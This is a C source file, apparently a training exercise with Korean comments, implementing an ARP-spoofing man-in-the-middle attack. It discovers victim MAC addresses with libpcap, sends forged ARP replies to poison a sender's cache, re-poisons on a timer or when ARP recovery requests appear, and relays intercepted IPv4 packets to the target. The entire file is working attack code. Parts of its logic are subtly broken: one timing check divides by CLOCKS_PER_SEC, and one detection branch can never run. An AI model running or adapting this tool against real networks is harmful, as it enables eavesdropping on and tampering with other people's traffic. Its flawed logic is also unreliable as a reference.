#include <stdio.h>
#include <unistd.h>
#include <pcap.h>
#include <stdint.h>
#include <arpa/inet.h>
#include <time.h>
#include <string.h>
#include "arp_packet.h"

int main(int argc, char* argv[]) 
{
    if (argc % 2 != 0 || argc < 3){
        usage();
        return -1;
    }
    printf("ARP SPOOFING START\n");

// 1. parameter handling
    uint8_t sender_ip[101][4];
    uint8_t sender_mac[101][6];
    uint8_t target_ip[101][4];
    uint8_t target_mac[101][6];

    int sender_target_pair_num = 0;
    for(int i = 2; i < argc; i += 2){
        char * sender_ip_string = argv[i];
        char * target_ip_string = argv[i+1];
        ip_str_to_addr(sender_ip_string, sender_ip[sender_target_pair_num]);
        ip_str_to_addr(target_ip_string, target_ip[sender_target_pair_num]);
        sender_target_pair_num++;
    }

    char * dev = argv[1];
    uint8_t attacker_mac[6];
    uint8_t attacker_ip[4];

    get_attacker_mac_addr(attacker_mac, dev);
    get_attacker_ip_addr(attacker_ip, dev);

// 2. get senders' mac addresses

        // arp request send packet
    arp_packet arp_packet_get_sender_mac_packet[101];
    arp_packet arp_packet_get_target_mac_packet[101];
    for(int now_pair = 0; now_pair < sender_target_pair_num; now_pair++){
        arp_packet_get_sender_mac_packet[now_pair] = arp_request_get_mac_addr(attacker_mac, sender_ip[now_pair], attacker_ip);
        arp_packet_get_target_mac_packet[now_pair] = arp_request_get_mac_addr(attacker_mac, target_ip[now_pair], attacker_ip);
    }
    
        // arp response send and receive
    struct pcap_pkthdr* header;
    const u_char * packet;
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t * handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
        return -1;
    }
    time_t last_sent_time;
    bool check = true;
    for(int now_pair = 0; now_pair < sender_target_pair_num; now_pair++){
        while (true) {
            if(!check){ // sent state
                // last sent_time - now(time) >= RESEND_SEC (5 sec), arp request must be re-sent
                if (time(NULL) - last_sent_time >= RESEND_SEC){
                    check = true;
                }
            }
            else{ // not sent state
                if(pcap_sendpacket(handle, (uint8_t *)(& arp_packet_get_sender_mac_packet[now_pair]), ARP_PACKET_LEN) != 0){
                    printf("[Error] packet sending is failed.\n");
                    return -1;
                }
                if(pcap_sendpacket(handle, (uint8_t *)(& arp_packet_get_sender_mac_packet[now_pair]), ARP_PACKET_LEN) != 0){
                    printf("[Error] packet sending is failed.\n");
                    return -1;
                } // send twice
                last_sent_time = time(NULL); // save last sent time
                check = false;
            }
            
            int res = pcap_next_ex(handle, &header, &packet);
            if (res == 0) continue;
            if (res == -1 || res == -2) break;

                // packet 분석 - if right arp response -> break loop, else loop again
            if(ntohs(*((uint16_t *)(packet + ETHERTYPE))) == Ethertype_ARP){ // ARP packet 확인
                if(ntohs(*((uint16_t *)(packet + ARP_OPCODE))) == ARP_operation_reply){ // ARP reply 확인
                    if(memcmp((uint8_t *)packet + ARP_SOURCE_IP_ADDR, sender_ip[now_pair], IPv4_address_length) == 0){ // check sender ip addr
                        if(memcmp((uint8_t *)packet + ARP_DESTINATION_MAC_ADDR, attacker_mac, MAC_address_length) != 0) continue;
                            // if mac addr is differnet, loop again
                        copy_6byte((uint8_t *)packet + ARP_SOURCE_MAC_ADDR, sender_mac[now_pair]);
                        printf("[Success] pair %d's Sender Mac Address: ", now_pair + 1);
                        print_6byte_mac(sender_mac[now_pair]); break;
                    }
                }
            }
        }
    }
    check = true;
    for(int now_pair = 0; now_pair < sender_target_pair_num; now_pair++){
        while (true) {
            if(!check){ // sent state
                // last sent time - now >= RESEND_SEC (5 sec), arp request must be re-sent
                if (time(NULL) - last_sent_time / CLOCKS_PER_SEC >= RESEND_SEC){
                    check = true;
                }
            }
            else{ // not sent state
                if(pcap_sendpacket(handle, (uint8_t *)(& arp_packet_get_target_mac_packet[now_pair]), ARP_PACKET_LEN) != 0){
                    printf("[Error] packet sending is failed.\n");
                    return -1;
                }
                if(pcap_sendpacket(handle, (uint8_t *)(& arp_packet_get_target_mac_packet[now_pair]), ARP_PACKET_LEN) != 0){
                    printf("[Error] packet sending is failed.\n");
                    return -1;
                } // send twice
                last_sent_time = time(NULL); // last sent time
                check = false;
            }
            
            int res = pcap_next_ex(handle, &header, &packet);
            if (res == 0) continue;
            if (res == -1 || res == -2) break;

                // packet 분석 - if right arp response -> break loop, else loop again
            if(ntohs(*((uint16_t *)(packet + ETHERTYPE))) == Ethertype_ARP){ // ARP packet 확인
                if(ntohs(*((uint16_t *)(packet + ARP_OPCODE))) == ARP_operation_reply){ // ARP reply 확인
                    if(memcmp((uint8_t *)packet + ARP_SOURCE_IP_ADDR, target_ip[now_pair], IPv4_address_length) == 0){ // check target ip addr
                        if(memcmp((uint8_t *)packet + ARP_DESTINATION_MAC_ADDR, attacker_mac, MAC_address_length) != 0) continue;
                            // if mac addr is differnet, loop again
                        copy_6byte((uint8_t *)packet + ARP_SOURCE_MAC_ADDR, target_mac[now_pair]);
                        printf("[Success] pair %d's Target Mac Address: ", now_pair + 1);
                        print_6byte_mac(target_mac[now_pair]); break;
                    }
                }
            }
        }
    }

// repeated phase
// want to sender -> ( attacker ) -> target, target -> (attacker) -> sender (== MITM attack)
// 3. arp spoofing: sender 에게 [ip = target ip / mac = attacker mac] 인 arp response 전송
    
    bool time_arp_spoof_reinfect = true; // check re-inject time
    bool need_arp_spoof_reinfect = false; // check re-infect is needed
    bool need_arp_spoof_reinfect_packet[101]; // check this pair must be re-infected
    memset(need_arp_spoof_reinfect_packet, false, sizeof(need_arp_spoof_reinfect_packet));
    
    arp_packet arp_packet_deceive_sender[101];
    for(int now_pair = 0; now_pair < sender_target_pair_num; now_pair++){
        arp_packet_deceive_sender[now_pair] = arp_reply_target_ip_with_attacker_mac(attacker_mac, sender_mac[now_pair], target_ip[now_pair], sender_ip[now_pair]);
    }

    while(true) {
        if(need_arp_spoof_reinfect || time_arp_spoof_reinfect){ // if reinfect needed
            if(time_arp_spoof_reinfect){
                for(int now_pair = 0; now_pair < sender_target_pair_num; now_pair++){
                    if(pcap_sendpacket(handle, (uint8_t *)(& arp_packet_deceive_sender[now_pair]), ARP_PACKET_LEN) != 0){
                        printf("[Error] pair %d's Sender Time Infect Packet Sending Failed.\n", now_pair + 1);
                        need_arp_spoof_reinfect_packet[now_pair] = true;
                        need_arp_spoof_reinfect = true;
                    }
                    else printf("[Success] pair %d's Sender Time Infect Packet Sent Successfully.\n", now_pair + 1);
                }
                time_arp_spoof_reinfect = false;
            }
            else if(need_arp_spoof_reinfect){
                for(int now_pair = 0; now_pair < sender_target_pair_num; now_pair++){
                    if(need_arp_spoof_reinfect_packet[now_pair] == true){ // only re-infect pair that needs re-inject
                        if(pcap_sendpacket(handle, (uint8_t *)(& arp_packet_deceive_sender[now_pair]), ARP_PACKET_LEN) != 0){
                            printf("[Error] pair %d's Sender Infect Packet Sending Failed.\n", now_pair + 1);
                            need_arp_spoof_reinfect_packet[now_pair] = true;
                        }
                        else{
                            printf("[Success] pair %d's Sender Infect Packet Sent Successfully.\n", now_pair + 1);
                            need_arp_spoof_reinfect_packet[now_pair] = false;
                        }
                    }
                }
                need_arp_spoof_reinfect = false;
            }
            else{
                printf("[Error] Detect Error in ReInfect Stage.\n");
                return -1;
            }
        }

        else{

// 4. packet relay (sender -> attacker -> target, target -> attacker -> sender)
// in this stage, if packet means ARP request (ARP recovery) we can maintain by arp inject (again)

    // receive from sender / send to target
            time_t check_time = time(NULL);
            while(true) {
                    // time check
                if (time(NULL) - check_time >= RESEND_SEC){ // if relay state lasts longer than RESEND_SEC(5 sec), try re-inject
                    time_arp_spoof_reinfect = true;
                    break;
                }
                    // packet receive (sender -> attacker)
                int res = pcap_next_ex(handle, &header, &packet);
                if (res == 0) continue;
                if (res == -1 || res == -2) break;

                for(int now_pair = 0; now_pair < sender_target_pair_num; now_pair++){
                    if(need_arp_spoof_reinfect_packet[now_pair] == true){ // if pair needs re-inject
                        need_arp_spoof_reinfect = true;
                        break; 
                    }

                    uint8_t broadcast[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
                    uint8_t arp_request_mac[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

                    // if detect ARP Recovery (sender <-> target arp request), must re-inject
                    if(ntohs(*((uint16_t *)(packet + ETHERTYPE))) == Ethertype_ARP){ // ARP packet 확인
                        if(ntohs(*((uint16_t *)(packet + ARP_OPCODE))) == ARP_operation_request){ // ARP request 확인

                                // 1. recovery: target broadcast ask
                            if(memcmp((uint8_t *)packet + ARP_SOURCE_IP_ADDR, target_ip[now_pair], IPv4_address_length) == SAME){ // check target ip addr
                                if(memcmp((uint8_t *)packet + ETHERNET_DESTINATION_MAC_ADDR, broadcast, MAC_address_length) == SAME){ // check broadcast
                                    printf("[Detected] ARP Request from target (broadcast).\n");
                                    need_arp_spoof_reinfect = true;
                                    need_arp_spoof_reinfect_packet[now_pair] = true;
                                    break;
                                }
                            }
                                // 2. recovery: sender broadcast ask
                            else if(memcmp((uint8_t *)packet + ARP_SOURCE_IP_ADDR, sender_ip[now_pair], IPv4_address_length) == SAME){ // check target ip addr
                                if(memcmp((uint8_t *)packet + ETHERNET_DESTINATION_MAC_ADDR, broadcast, MAC_address_length) == SAME){ // check broadcast
                                    printf("[Detected] ARP Request from sender (broadcast).\n");
                                    need_arp_spoof_reinfect = true;
                                    need_arp_spoof_reinfect_packet[now_pair] = true;
                                    break;
                                }
                            }
                                // 3. recovery: sender -> target ip & attacker mac (unicast) ask
                            else if(memcmp((uint8_t *)packet + ARP_SOURCE_IP_ADDR, sender_ip[now_pair], IPv4_address_length) == SAME){ // check sender ip addr
                                printf("st check1\n");
                                if(memcmp((uint8_t *)packet + ARP_DESTINATION_IP_ADDR, target_ip[now_pair], IPv4_address_length) == SAME){ // check target ip addr
                                    printf("st check2\n");
                                    if(memcmp((uint8_t *)packet + ETHERNET_DESTINATION_MAC_ADDR, attacker_mac, MAC_address_length) == SAME){
                                        printf("[Detected] ARP Request from sender to target (unicast).\n");
                                        need_arp_spoof_reinfect = true;
                                        need_arp_spoof_reinfect_packet[now_pair] = true;
                                        break;
                                    }
                                }
                            }
                            else {}
                        }
                        else if(ntohs(*((uint16_t *)(packet + ARP_OPCODE))) == ARP_operation_reply) {}
                        else{}
                    }
                        
                    // packet relay (In Layer 3)
                        // sender -> attacker -> target
                        // check packet src == sender_ip & packet dst == target_ip
                        
                    if(ntohs(*((uint16_t *)(packet + ETHERTYPE))) == Ethertype_IPv4){
                        if(memcmp((uint8_t *)packet + ETHERNET_DESTINATION_MAC_ADDR, attacker_mac, MAC_address_length) == SAME){
                                // sender -> target relay
                            if(memcmp((uint8_t *)packet + IPv4_SOURCE_IP_ADDR, sender_ip[now_pair], IPv4_address_length) == SAME){ // check target ip addr
                                uint8_t * now_packet = (uint8_t *) packet;
                                    // while packet relaying, we only change mac addr
                                        // src_mac = sender, dst_mac = attacker => src_mac = attacker, dst_mac = target
                                copy_6byte(attacker_mac, now_packet + ETHERNET_SOURCE_MAC_ADDR);
                                copy_6byte(target_mac[now_pair], now_packet + ETHERNET_DESTINATION_MAC_ADDR);
                                if(pcap_sendpacket(handle, now_packet, header->caplen) != 0){ // send packet attacker -> target
                                    printf("[Error] pair %d's Packet Relay Failed.\n", now_pair);
                                } 
                                break;
                            }
                            else{}
                        }
                        else{}
                    }
                }
                if(need_arp_spoof_reinfect) break;
            }
        }
    }
    return 0;
}
